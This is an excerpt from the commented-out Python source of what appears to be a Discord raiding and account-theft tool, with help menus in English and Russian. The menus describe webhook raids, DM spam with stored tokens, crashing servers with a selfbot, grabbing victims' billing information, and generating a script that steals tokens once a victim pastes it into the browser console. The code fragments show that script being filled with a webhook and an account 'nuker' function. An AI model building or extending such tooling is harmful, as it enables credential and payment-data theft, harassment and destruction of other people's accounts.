...
# [3] - Help.
# [4] - Grab info from valid tokens (in valid_tokens.txt)"""
...
# defaultMessage3 = (
#     "```| You are being raided | Our telegram =>``` ```t.me/anarchy_squad```"
# )
...
# [3] - This spamessageser will start a raid of the server with webhooks, the raid can be of high productivity, in terms of the fact that there is no protection from it.
...
# [12] - This item will allow you to crash the server using a selfbot. This requires an admin token.
# [13] - This item will help you to grab information about the victim's billing accounts from the account.
# [14] - This item will help you animate the server name/status/nickname on the server/nickname of another person on the server/group name/channel name on the server.
# [15] - This item will allow you to generate a malicious script to steal a token. To use it, you need the victim to paste it into the console (Ctrl + shift + i).
# [16] - This item will nuke discord account. Requires an victims token
# [17] - Help menu.
# [18] - Exit."""

# helpsRU = """
# Более подробное описание смотрите в самих пунктах.
...
# [12] - Этот пункт позволит вам крашнуть сервер, используя мощности селфбота. Для этого нужен токен администратора.
# [13] - Этот пункт поможет вам получить информацию о платежных счетах жертвы из учетной записи.
# [14] - Этот пункт поможет вам анимировать имя сервера/статус/ник на сервере/ник другого человека на сервере/имя группы/имя канала на сервере.
# [15] - Этот пункт позволит вам сгенерировать вредоносный скрипт для кражи токена. Чтоюбы его использовать вам нужно чтобы жертва вставила его в консоль (Ctrl + shift + i).
# [16] - Этот пункт уничтожает дискорд аккаунт. Для этого нужен токен жертвы
# [17] - Меню помощи.
# [18] - Выход.
# """
# helpWebhookToolRU = """
# [1] - Этот пункт позволит вам устроить рейд на 1 вебхук, используя кастомный или дефолтный текст.
...
# """
# helpWebhookToolEN = """
# [1] - This item will allow you to raid 1 webhook using custom or default text.
...
# helpdmSpamessagesRU = "Этот пункт позволит вам заспамить ЛС, используя токены которые лежат в текстовом файле tokens.txt. Примичание: ваши рейд аккаунты должны быть на одном сервере с самой жертвой. Помимо этого у неё должен быть открыт ЛС. "

# helpdmSpamessagesEN = "This item will allow you to spam DM using the tokens that are in the tokens.txt text file. Advice: your raid accounts must be on the same server as the victim. In addition, she must have a DM open."
...
# helpLeaveRU = (
#     "Этот пункт позволит вам кикнуть все ваши рейд аккаунты с указаного сервера."
# )

# helpLeaveEN = (
#     "This item will allow you to kick all your raid accounts from the specified server."
# )

# helpJoinerRU = (
#     "Этот пункт позволит вам добавить все ваши рейд аккаунты на указаный сервер."
# )

# helpJoinerEN = (
#     "This item will allow you to add all your raid accounts to the specified server."
# )
...
#                 webhook2 = out2[10:]
#                 icon = out12[10:]
#                 script2 = script.replace("WEB_HOOK", webhook2).replace("ICOON", icon)
...
#             select = str(input("\nSelect: "))
#             if select == "1":
#                 print(helpdmSpamessagesEN)
#             elif select == "2":
#                 print(helpdmSpamessagesRU)
#             else:
#                 print("\nInvalid option.")
#         else:
#             print("\nInvalid option.")
...
#             )
#             grabreq = req.json()
#             if req.status_code in statuses and grabreq is not list():
#                 for grab in grabreq:
...
#                     )
#                 # for _ in range(10):
#                 #     target = Thread(target=gl(setting, token, sessionName, errorLog),args=(1,))
#                 #     target.start()
...
# def nuker():
#     token = input("\nToken: ")
#     if validToken(token, True) == "Valid.":
#         while True:
